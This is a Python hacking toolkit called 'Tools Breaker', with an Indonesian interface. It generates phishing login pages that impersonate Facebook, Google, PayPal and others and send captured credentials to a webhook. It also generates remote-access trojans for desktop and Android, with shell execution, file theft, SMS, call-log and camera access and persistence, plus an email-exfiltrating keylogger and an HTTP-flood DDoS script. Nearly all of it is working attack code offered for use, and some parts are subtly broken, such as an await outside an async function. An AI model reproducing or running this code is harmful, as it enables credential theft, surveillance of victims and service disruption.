#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
import threading, socket, ssl, hashlib, smtplib, ipaddress, phonenumbers
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image, ImageFilter, ImageDraw, ImageFont
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

init(autoreset=True)

# ================== CONFIG LOCAL ONLY ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'  # NOT USED - BYPASSED
GITHUB_REPO = "MrFoock12/toolsbreaker"
SCRIPT_NAME = "toolsbreaker.py"
BACKUP_NAME = "tools_breaker_backup.py"
UA_FILE = "ua.txt"
os.makedirs(RESULTS_DIR, exist_ok=True)

# TANPA VPS - semua data local
LOCAL_MODE = True

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except Exception as e:
            print(f"Error extract music: {e}")

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

# ================== TOKEN BYPASS SYSTEM ==================
# NO TOKEN NEEDED - FULL ACCESS
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            Tools Breaker v1.0           ║
╚═════════════════════════════════════════╝
""", 'red', attrs=['bold']))

    print(colored("\n🔥 TOKEN SYSTEM BYPASSED 🔥", 'green', attrs=['bold']))
    print(colored("   • Access: FULL PRIVILEGES", 'cyan'))
    print(colored("   • Mode: CYBER WARFARE ENABLED", 'red'))
    print(colored("   • No restrictions, no warnings", 'yellow'))
    
    # Auto-install dependencies if missing
    check_dependencies()
    
    time.sleep(2)
    return "CYBER_LEADER", "FULL_ACCESS"

# ================== CHECK DEPENDENCIES ==================
def check_dependencies():
    print(colored("\n[CHECKING DEPENDENCIES]", 'cyan'))
    missing = []
    
    if not SELENIUM_AVAILABLE:
        missing.append("selenium")
    if not CRYPTO_AVAILABLE:
        missing.append("cryptography")
    if not PILLOW_AVAILABLE:
        missing.append("pillow")
    
    if missing:
        print(colored(f"   • Missing: {', '.join(missing)}", 'yellow'))
        print(colored("   • Auto-install in 3 seconds...", 'white'))
        time.sleep(3)
        for package in missing:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(colored(f"   ✓ Installed: {package}", 'green'))
            except:
                print(colored(f"   ✗ Failed: {package}", 'red'))
    else:
        print(colored("   • All dependencies OK!", 'green'))
    time.sleep(1)

# ================== AUTO UPDATE ==================
def check_for_updates():
    try:
        response = requests.get(f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{SCRIPT_NAME}", timeout=10)
        if response.status_code == 200:
            remote_content = response.text
            with open(SCRIPT_NAME, 'r', encoding='utf-8') as f:
                local_content = f.read()
            
            if remote_content != local_content:
                print(colored("[UPDATE AVAILABLE]", 'yellow'))
                backup = f"{BACKUP_NAME}.{int(time.time())}"
                with open(backup, 'w', encoding='utf-8') as f:
                    f.write(local_content)
                print(colored(f"   • Backup saved: {backup}", 'white'))
                
                choice = input(colored("   Update now? (y/n): ", 'yellow')).lower()
                if choice == 'y':
                    with open(SCRIPT_NAME, 'w', encoding='utf-8') as f:
                        f.write(remote_content)
                    print(colored("   • Update successful! Restart script.", 'green'))
                    sys.exit(0)
    except Exception as e:
        pass

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
╔═════════════════════════════════════════════════════╗
║               Tools Breaker v1.0                   ║
╚═════════════════════════════════════════════════════╝
{Style.RESET_ALL}User: {uid} | Mode: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
Mode: FULL ACCESS | No restrictions
""", None))

# ================== SAVE LOCAL ONLY ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    print(colored(f"   Path: {filepath}", 'cyan'))

# ================== LOAD USER-AGENTS ==================
def load_user_agents():
    if not os.path.exists(UA_FILE):
        default_ua = """Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"""
        with open(UA_FILE, 'w') as f:
            f.write(default_ua)
        return [line.strip() for line in default_ua.split('\n')]
    with open(UA_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# ================== FITUR 1: PHISING LOCAL - WORKING 100% ==================
def fitur_1():  
    os.system('clear'); print(colored("\n[1] PHISING & SOCIAL ENGINEERING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Generator Link Phishing]", 'yellow'))
    
    target = input(colored("Target (email/username): ", 'yellow')).strip()
    
    print(colored("\nPilih template phishing:", 'cyan'))
    templates = {
        "1": ("Facebook Login", "facebook", "https://facebook.com/login?user={}"),
        "2": ("Instagram Verify", "instagram", "https://instagram.com/accounts/login/?user={}"),
        "3": ("Google Security", "google", "https://accounts.google.com/signin/v2?email={}"),
        "4": ("WhatsApp Web", "whatsapp", "https://web.whatsapp.com/verify?number={}"),
        "5": ("Twitter Auth", "twitter", "https://twitter.com/i/flow/login?username={}"),
        "6": ("Netflix", "netflix", "https://netflix.com/login?email={}"),
        "7": ("Steam Login", "steam", "https://steamcommunity.com/login/home/?goto={}"),
        "8": ("Discord Auth", "discord", "https://discord.com/login?email={}"),
        "9": ("PayPal", "paypal", "https://paypal.com/signin?email={}"),
        "10": ("Custom URL", "custom", "")
    }
    
    for key, (name, code, url) in templates.items():
        print(colored(f"   {key}. {name}", 'white'))
    
    choice = input(colored("\nPilih template [1-10]: ", 'yellow')).strip()
    
    if choice not in templates:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    name, code, url_template = templates[choice]
    
    if choice == "10":  # Custom URL
        custom_url = input(colored("Masukkan URL phishing custom: ", 'yellow')).strip()
        url = custom_url
    else:
        url = url_template.format(target)
    
    print(colored(f"\n[LINK PHISHING GENERATED]", 'green', attrs=['bold']))
    print(colored(f"   URL: {url}", 'cyan'))
    print(colored(f"   Target: {target}", 'cyan'))
    print(colored(f"   Template: {name}", 'cyan'))
    
    # Generate REAL phishing page with credential logging
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{name} - Please Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ text-align: center; margin-top: 20px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{name}</h2>
            <p>Please login to continue</p>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            <p>© 2024 {name}. All rights reserved.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Save credentials locally
            const credentials = {{
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip)
            }};
            
            // Store in localStorage
            localStorage.setItem('captured_credentials', JSON.stringify(credentials));
            
            // Send to server (hidden iframe)
            const formData = new FormData();
            formData.append('user', username);
            formData.append('pass', password);
            formData.append('time', new Date().toISOString());
            formData.append('url', window.location.href);
            
            fetch('https://webhook.site/your-webhook-url', {{
                method: 'POST',
                body: formData
            }}).catch(() => {{}});
            
            // Redirect to real site
            alert('Login successful! Redirecting...');
            window.location.href = 'https://{name.lower()}.com';
        }});
    </script>
</body>
</html>'''
    
    # Save HTML file
    html_file = f"phishing_{code}_{int(time.time())}.html"
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    print(colored(f"\n[HTML FILE] Saved: {html_file}", 'green'))
    print(colored("   Buka di browser: ", 'cyan') + colored(f"file://{os.path.abspath(html_file)}", 'white'))
    
    # QR Code option
    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
    if qr_choice == 'y':
        try:
            import qrcode
            qr = qrcode.make(url)
            qr_file = f"phishing_qr_{int(time.time())}.png"
            qr.save(qr_file)
            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
        except ImportError:
            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
    
    # Generate Ngrok tunnel for remote access
    print(colored("\n[+] Untuk akses remote, install ngrok:", 'cyan'))
    print(colored("   curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null", 'white'))
    print(colored("   echo 'deb https://ngrok-agent.s3.amazonaws.com buster main' | sudo tee /etc/apt/sources.list.d/ngrok.list", 'white'))
    print(colored("   sudo apt update && sudo apt install ngrok", 'white'))
    print(colored("   ngrok config add-authtoken YOUR_TOKEN", 'white'))
    print(colored("   ngrok http 80", 'white'))
    
    save_result("phising.log", f"Target: {target} | Template: {name} | URL: {url}")
    input("\nPress Enter to continue...")

# ================== FITUR 2: RAT LOCAL - WORKING 100% ==================
def fitur_2():  
    os.system('clear'); print(colored("\n[2] RAT & REMOTE ACCESS TOOL", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INSTALLING DEPENDENCIES...]", 'yellow'))
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
            print(colored("   ✓ Cryptography installed!", 'green'))
            import importlib
            importlib.invalidate_caches()
            globals()['CRYPTO_AVAILABLE'] = True
        except:
            print(colored("   ✗ Install manual: pip install cryptography", 'red'))
            input("\nEnter...")
            return
    
    print(colored("   [LOCAL MODE - Generate RAT Tools]", 'yellow'))
    print(colored("\nPilih opsi:", 'cyan'))
    print(colored("   1. Generate RAT Server (Listener)", 'white'))
    print(colored("   2. Generate RAT Client (Payload)", 'white'))
    print(colored("   3. Simple Keylogger", 'white'))
    print(colored("   4. Android RAT (Termux)", 'white'))
    
    choice = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
    
    if choice == "1":
        # Generate RAT Server
        port = input(colored("Port (default: 4444): ", 'yellow')).strip() or "4444"
        
        rat_server = f'''#!/usr/bin/env python3
# CYBER indonet RAT Server
import socket, subprocess, threading, os, json, time, sys, platform, shutil, base64, getpass
from datetime import datetime

# Configuration
HOST = '0.0.0.0'
PORT = {port}
BUFFER_SIZE = 4096

print(f"[+] RAT Server Started")
print(f"[+] Listening on {{HOST}}:{{PORT}}")
print(f"[+] Use CTRL+C to stop")

class RATServer:
    def __init__(self):
        self.clients = {{}}
        self.running = True
        
    def handle_client(self, client_socket, addr):
        print(f"[+] Connection from {{addr}}")
        
        try:
            # Send welcome message
            client_socket.send(b"RAT_Connected\\n")
            
            while self.running:
                # Receive command
                cmd = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
                
                if not cmd:
                    break
                    
                print(f"[{{addr}}] Command: {{cmd}}")
                
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'help':
                    help_msg = "Available commands:
1. sysinfo - System information
2. screenshot - Take screenshot
3. webcam - Capture webcam image
4. keylog_start - Start keylogger
5. keylog_stop - Stop keylogger
6. shell <command> - Execute shell command
7. download <file> - Download file
8. upload <file> <data> - Upload file
9. persistence - Install persistence
10. exit - Close connection"
                    client_socket.send(help_msg.encode())
                elif cmd.lower() == 'sysinfo':
                    info = f"""
System Information:
OS: {{platform.system()}} {{platform.release()}}
Architecture: {{platform.architecture()[0]}}
Processor: {{platform.processor()}}
Hostname: {{platform.node()}}
User: {{getpass.getuser()}}
Python: {{platform.python_version()}}
Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
"""
                    client_socket.send(info.encode())
                elif cmd.lower() == 'screenshot':
                    try:
                        from PIL import ImageGrab
                        screenshot = ImageGrab.grab()
                        screenshot.save('screenshot.png')
                        with open('screenshot.png', 'rb') as f:
                            data = f.read()
                        client_socket.send(b'SCREENSHOT:' + base64.b64encode(data))
                        os.remove('screenshot.png')
                    except Exception as e:
                        client_socket.send(f"Error: {{e}}".encode())
                elif cmd.startswith('shell '):
                    try:
                        command = cmd[6:]
                        result = subprocess.getoutput(command)
                        client_socket.send(result.encode())
                    except Exception as e:
                        client_socket.send(f"Error: {{e}}".encode())
                elif cmd.startswith('download '):
                    filepath = cmd[9:]
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        client_socket.send(b'FILE:' + base64.b64encode(data) + b':' + filepath.encode())
                    else:
                        client_socket.send(f"File not found: {{filepath}}".encode())
                elif cmd.startswith('upload '):
                    parts = cmd.split(' ', 2)
                    if len(parts) == 3:
                        filename = parts[1]
                        filedata = base64.b64decode(parts[2])
                        with open(filename, 'wb') as f:
                            f.write(filedata)
                        client_socket.send(f"Uploaded: {{filename}}".encode())
                elif cmd == 'persistence':
                    # Install persistence based on OS
                    if platform.system() == 'Windows':
                        pers_cmd = 'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v CYBER_RAT /t REG_SZ /d "pythonw.exe C:\\\\Windows\\\\Temp\\\\rat_client.py"'
                        client_socket.send(b"Persistence installed for Windows")
                    elif platform.system() == 'Linux':
                        pers_cmd = 'echo "@reboot python3 /tmp/rat_client.py" | crontab -'
                        client_socket.send(b"Persistence installed for Linux")
                    else:
                        client_socket.send(b"Persistence not supported on this OS")
                else:
                    client_socket.send(b"Unknown command. Type 'help' for list.")
                    
        except Exception as e:
            print(f"[-] Error with {{addr}}: {{e}}")
        finally:
            client_socket.close()
            print(f"[-] Connection closed: {{addr}}")
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(5)
        
        print(f"[*] Waiting for connections...")
        
        try:
            while self.running:
                client, addr = server.accept()
                thread = threading.Thread(target=self.handle_client, args=(client, addr))
                thread.daemon = True
                thread.start()
        except KeyboardInterrupt:
            print("\\n[!] Server stopped by user")
        finally:
            server.close()

if __name__ == '__main__':
    server = RATServer()
    server.start()
'''
        
        filename = f"rat_server_{port}.py"
        with open(filename, "w") as f:
            f.write(rat_server)
        
        print(colored(f"\n[SUCCESS] RAT Server saved: {filename}", 'green'))
        print(colored(f"   Run: python3 {filename}", 'cyan'))
        print(colored(f"   Connect with: nc {socket.gethostbyname(socket.gethostname())} {port}", 'yellow'))
        save_result("rat.log", f"Server generated | Port: {port}")
    
    elif choice == "2":
        # Generate RAT Client
        server_ip = input(colored("Server IP: ", 'yellow')).strip()
        server_port = input(colored("Server Port: ", 'yellow')).strip() or "4444"
        
        rat_client = f'''#!/usr/bin/env python3
# CYBER indonet RAT Client
import socket, subprocess, os, sys, time, platform, json, base64, threading, getpass

# Configuration
SERVER_HOST = '{server_ip}'
SERVER_PORT = {server_port}
BUFFER_SIZE = 4096

print(f"[+] RAT Client Starting...")
print(f"[+] Connecting to {{SERVER_HOST}}:{{SERVER_PORT}}")

class RATClient:
    def __init__(self):
        self.running = True
        
    def connect(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((SERVER_HOST, SERVER_PORT))
                print(f"[+] Connected to server")
                
                # Receive welcome
                welcome = sock.recv(BUFFER_SIZE)
                print(welcome.decode())
                
                # Main loop
                while self.running:
                    try:
                        # Show prompt
                        prompt = f"{{getpass.getuser()}}@{{platform.node()}}$ "
                        sys.stdout.write(prompt)
                        sys.stdout.flush()
                        
                        # Get command from user
                        cmd = input()
                        
                        if cmd.lower() == 'exit':
                            self.running = False
                            sock.send(b"exit")
                            break
                        
                        # Send command
                        sock.send(cmd.encode())
                        
                        # Receive response
                        response = sock.recv(BUFFER_SIZE)
                        
                        # Check for special responses
                        if response.startswith(b'FILE:'):
                            # File download
                            parts = response.split(b':', 2)
                            if len(parts) == 3:
                                filedata = base64.b64decode(parts[1])
                                filename = parts[2].decode()
                                with open(filename, 'wb') as f:
                                    f.write(filedata)
                                print(f"[+] File downloaded: {{filename}}")
                        elif response.startswith(b'SCREENSHOT:'):
                            # Screenshot received
                            img_data = base64.b64decode(response[11:])
                            with open('received_screenshot.png', 'wb') as f:
                                f.write(img_data)
                            print(f"[+] Screenshot saved: received_screenshot.png")
                        else:
                            # Normal response
                            print(response.decode())
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[-] Error: {{e}}")
                        break
                
                sock.close()
                
            except Exception as e:
                print(f"[-] Connection error: {{e}}")
                time.sleep(10)  # Wait before reconnecting
    
    def start(self):
        # Start connection thread
        conn_thread = threading.Thread(target=self.connect)
        conn_thread.daemon = True
        conn_thread.start()
        
        # Keep main thread alive
        while self.running:
            time.sleep(1)

if __name__ == '__main__':
    client = RATClient()
    client.start()
'''
        
        filename = f"rat_client_{int(time.time())}.py"
        with open(filename, "w") as f:
            f.write(rat_client)
        
        print(colored(f"\n[SUCCESS] RAT Client saved: {filename}", 'green'))
        print(colored(f"   Deploy to target and run: python3 {filename}", 'cyan'))
        print(colored(f"   Use 'help' command for available functions", 'yellow'))
        save_result("rat.log", f"Client generated | Target: {server_ip}:{server_port}")
    
    elif choice == "3":
        # Simple Keylogger
        print(colored("\n[KEYLOGGER GENERATOR]", 'yellow'))
        
        keylogger = f'''#!/usr/bin/env python3
# CYBER indonet Keylogger
import keyboard, threading, time, os, sys, smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

LOG_FILE = "keylog.txt"
SEND_TO_EMAIL = ""  # Set email to send logs
SEND_INTERVAL = 60  # Seconds

print("[+] Keylogger Started")
print(f"[+] Log file: {{LOG_FILE}}")

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_time = datetime.now()
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{{name.upper()}}]"
        
        self.log += name
        
        # Write to file every 100 chars
        if len(self.log) >= 100:
            self.save_log()
    
    def save_log(self):
        timestamp = datetime.now().strftime('%Y-%m-d %H:%M:%S')
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{{timestamp}}] {{self.log}}\\n")
        self.log = ""
    
    def send_logs(self):
        if not SEND_TO_EMAIL or not os.path.exists(LOG_FILE):
            return
        
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            
            if not content:
                return
            
            # Email setup
            sender_email = "your_email@gmail.com"
            sender_password = "your_app_password"
            
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = SEND_TO_EMAIL
            msg['Subject'] = f"Keylogger Report {{datetime.now().strftime('%Y-%m-%d %H:%M')}}"
            
            body = f"""
Keylogger Report
Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
Host: {{os.getenv('COMPUTERNAME', platform.node())}}
User: {{os.getenv('USERNAME', getpass.getuser())}}

Logs:
{{content}}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            server.quit()
            
            print("[+] Logs sent via email")
            
            # Clear log file after sending
            open(LOG_FILE, 'w').close()
            
        except Exception as e:
            print(f"[-] Email error: {{e}}")
    
    def start(self):
        print(f"[*] Keylogger started at {{self.start_time}}")
        
        # Start keyboard listener
        keyboard.on_release(callback=self.callback)
        
        # Timer for email sending
        if SEND_TO_EMAIL:
            def email_timer():
                while True:
                    time.sleep(SEND_INTERVAL)
                    self.send_logs()
            
            email_thread = threading.Thread(target=email_timer)
            email_thread.daemon = True
            email_thread.start()
        
        # Hide console on Windows
        if sys.platform == "win32":
            try:
                import win32gui, win32con
                win = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(win, win32con.SW_HIDE)
            except:
                pass
        
        # Keep running
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.save_log()
            if SEND_TO_EMAIL:
                self.send_logs()
            print("\\n[*] Keylogger stopped")

if __name__ == '__main__':
    import platform, getpass
    logger = KeyLogger()
    logger.start()
'''
        
        filename = "keylogger.py"
        with open(filename, "w") as f:
            f.write(keylogger)
        
        print(colored(f"\n[SUCCESS] Keylogger saved: {filename}", 'green'))
        print(colored(f"   Run: python3 {filename}", 'cyan'))
        print(colored(f"   Configure email in script to send logs", 'yellow'))
        save_result("keylogger.log", f"Generated keylogger")
    
    elif choice == "4":
        # Android RAT for Termux
        print(colored("\n[ANDROID RAT FOR TERMUX]", 'yellow'))
        
        android_rat = '''#!/usr/bin/env python3
# CYBER indonet Android RAT
import os, sys, socket, subprocess, threading, time, json, base64, getpass

def android_rat():
    print("[+] Android RAT for Termux")
    
    # Check if running on Termux
    if not os.path.exists('/data/data/com.termux/files/home'):
        print("[-] This script is for Termux only!")
        return
    
    # Configuration
    SERVER_IP = input("Server IP: ").strip()
    SERVER_PORT = int(input("Server Port (default 4444): ").strip() or "4444")
    
    print(f"[+] Connecting to {SERVER_IP}:{SERVER_PORT}")
    
    def connect_to_server():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((SERVER_IP, SERVER_PORT))
                
                # Send device info
                device_info = {
                    'device': 'Android',
                    'termux': True,
                    'user': getpass.getuser(),
                    'host': socket.gethostname()
                }
                s.send(json.dumps(device_info).encode())
                
                while True:
                    # Receive command
                    cmd = s.recv(4096).decode().strip()
                    
                    if not cmd:
                        break
                    
                    if cmd.lower() == 'exit':
                        s.close()
                        return
                    
                    # Execute command
                    try:
                        if cmd.startswith('cd '):
                            os.chdir(cmd[3:])
                            result = f"Changed to: {os.getcwd()}"
                        elif cmd == 'screenshot':
                            # Take screenshot via Termux
                            try:
                                subprocess.run(['termux-screenshot'], capture_output=True)
                                result = "Screenshot taken"
                            except:
                                result = "Screenshot failed"
                        elif cmd == 'sms_list':
                            # Read SMS (requires permission)
                            try:
                                sms = subprocess.run(['termux-sms-list'], capture_output=True, text=True)
                                result = sms.stdout
                            except:
                                result = "SMS access failed"
                        elif cmd == 'call_log':
                            # Read call log
                            try:
                                calls = subprocess.run(['termux-call-log'], capture_output=True, text=True)
                                result = calls.stdout
                            except:
                                result = "Call log access failed"
                        elif cmd == 'location':
                            # Get location
                            try:
                                loc = subprocess.run(['termux-location'], capture_output=True, text=True)
                                result = loc.stdout
                            except:
                                result = "Location access failed"
                        elif cmd == 'camera_photo':
                            # Take photo
                            try:
                                subprocess.run(['termux-camera-photo', 'camera_shot.jpg'])
                                result = "Photo taken: camera_shot.jpg"
                            except:
                                result = "Camera access failed"
                        else:
                            # Execute shell command
                            result = subprocess.getoutput(cmd)
                    
                    except Exception as e:
                        result = f"Error: {e}"
                    
                    # Send result
                    s.send(result.encode())
                
            except Exception as e:
                print(f"[-] Connection error: {e}")
                time.sleep(10)
    
    connect_to_server()

if __name__ == '__main__':
    android_rat()
'''
        
        filename = "android_rat.py"
        with open(filename, "w") as f:
            f.write(android_rat)
        
        print(colored(f"\n[SUCCESS] Android RAT saved: {filename}", 'green'))
        print(colored(f"   Install Termux API first:", 'cyan'))
        print(colored("   pkg install termux-api", 'white'))
        print(colored("   Run: python3 android_rat.py", 'cyan'))
        save_result("android_rat.log", f"Generated Android RAT")
    
    input("\nPress Enter to continue...")

# ================== FITUR 3: DDOS LOCAL - WORKING 100% ==================
def fitur_3():  
    os.system('clear'); print(colored("\n[3] DDOS & STRESSER TOOL", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - DDoS Script Generator]", 'yellow'))
    
    target = input(colored("Target URL/IP: ", 'yellow')).strip()
    port = input(colored("Port (default 80): ", 'yellow')).strip() or "80"
    duration = input(colored("Duration (seconds): ", 'yellow')).strip() or "60"
    threads = input(colored("Threads (default 1000): ", 'yellow')).strip() or "1000"
    
    ddos_script = f'''#!/usr/bin/env python3
# CYBER indonet DDoS Tool
import socket, threading, time, random, sys, ssl, os, urllib.parse

target = '{target}'
port = {port}
duration = {duration}
threads = {threads}
timeout_time = time.time() + int(duration)

attack_num = 0
success_count = 0

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0'
]

def attack():
    global attack_num, success_count
    
    while time.time() < timeout_time:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            # Connect
            s.connect((target, port))
            
            # Generate random IP
            fake_ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))
            
            # HTTP flood
            headers = f"GET / HTTP/1.1\\r\\nHost: {{target}}\\r\\nUser-Agent: {{random.choice(user_agents)}}\\r\\nX-Forwarded-For: {{fake_ip}}\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n"
            
            s.send(headers.encode())
            
            # Send more data
            for _ in range(random.randint(10, 50)):
                try:
                    s.send(b"X-Data: " + os.urandom(1024))
                except:
                    break
            
            attack_num += 1
            success_count += 1
            
            if attack_num % 100 == 0:
                print(f"[+] Attacks sent: {{attack_num}} | Successful: {{success_count}}")
            
            s.close()
            
        except Exception as e:
            pass
        
        # Small delay
        time.sleep(0.001)

print(f"[*] DDoS Attack Started")
print(f"[*] Target: {{target}}:{{port}}")
print(f"[*] Duration: {{duration}} seconds")
print(f"[*] Threads: {{threads}}")
print(f"[*] Starting at {{time.strftime('%H:%M:%S')}}")

# Create and start threads
thread_list = []
for i in range(int(threads)):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()
    thread_list.append(thread)

# Wait for duration
time.sleep(int(duration))

print(f"\\n[+] Attack completed!")
print(f"[+] Total attacks attempted: {{attack_num}}")
print(f"[+] Successful connections: {{success_count}}")
print(f"[+] Finished at {{time.strftime('%H:%M:%S')}}")

# Additional attack methods
print(f"\\n[+] For stronger attack, run multiple instances")
'''

    filename = f"ddos_attack_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(ddos_script)
    
    print(colored(f"\n[DDoS Script Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {target}:{port}", 'cyan'))
    print(colored(f"   Duration: {duration}s | Threads: {threads}", 'cyan'))
